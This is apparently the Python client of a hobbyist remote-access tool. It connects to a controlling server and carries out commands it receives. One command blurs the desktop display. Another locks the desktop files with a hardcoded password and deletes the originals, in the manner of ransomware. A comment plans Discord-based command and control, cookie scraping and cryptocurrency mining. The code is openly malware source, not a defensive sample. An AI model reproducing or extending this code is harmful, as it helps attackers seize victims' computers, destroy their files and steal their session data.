import os
import socket

from system.filemanager import FileManager
from system.displaymanager import DisplayManager
from system.processmanager import ProcessManager


# we are going to have to find a way to connect to our discord bot and execute commands from there
#im thinking of using some form of tcp who knows or cares right now we just need to add more features maybe cookie scraping and bitcoin mining

class Client:

    def __init__(self, host='localhost', port=65432) -> None:
        self.host = host
        self.port = port

    def start(self)-> bool:

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.client_socket:

            self.client_socket.connect((self.host, self.port))
            print(f'connected to {self.host}:{self.port}')

            self.command_handler()


    def command_handler(self):
        display_manager = DisplayManager()
        process_manager = ProcessManager()
        file_manager = FileManager()
        while True:
            self.client_socket.timeout(5.0)

            try:
                command = self.client_socket.recv(1024).decode()

                if command:
                    print(f'recieved command {command.lower()}')

                    if command.lower() == 'exit':
                        break

                    elif command.lower() == 'change_background':
                        if not display_manager.blur_display():
                            response = str('failed to change background')
                            self.client_socket.sendall(response.encode())
                        
                    elif command.lower() == 'lock-desktop-files':
                        files = file_manager.list_files(file_manager.get_desktop_path())
                        file_manager.lock_files(files, file_manager.get_desktop_path(), 'password123')
                        
                        for file in files:
                            file_manager.remove_file(file)

            except Exception as e:
                print(f'exception is {e}')




if __name__ == '__main__':
    # our main code
    our_client = Client()

    our_client.start()# start our commmand handler